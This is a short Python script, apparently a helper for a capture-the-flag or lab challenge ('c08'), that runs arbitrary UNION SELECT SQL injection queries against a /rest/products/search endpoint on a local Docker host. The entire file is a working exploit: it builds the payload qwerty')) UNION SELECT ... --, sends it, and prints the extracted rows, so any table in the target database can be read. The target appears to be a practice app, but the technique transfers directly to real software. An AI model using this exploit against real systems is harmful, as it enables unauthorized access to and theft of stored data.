#!/usr/bin/env python3
"""c08 helper: arbitrary UNION SELECT against /rest/products/search (10 cols).

Usage: c08_sqli_query.py "<SQL select list with exactly 10 cols>" [maxrows]

Products has 10 columns; payload shape:  qwerty')) UNION SELECT <cursor>-- 
Any column can hold text; non-numeric columns get returned verbatim.
"""
import json
import sys
import urllib.parse
import urllib.request
import urllib.error

BASE = "http://host.docker.internal:3000/rest/products/search?q="


def inject(select: str):
    payload = "qwerty')) UNION SELECT " + select + "--"
    url = BASE + urllib.parse.quote(payload, safe="")
    req = urllib.request.Request(url, headers={"User-Agent": "c08-sqli/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "replace")


def main():
    select = sys.argv[1]
    body = inject(select)
    try:
        rows = json.loads(body)["data"]
    except Exception:
        i = body.find("Error:")
        print("[!] query failed:", body[i:i + 300].split("<")[0] if i >= 0 else body[:300])
        return 1
    for r in rows:
        print(json.dumps(r, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    sys.exit(main())
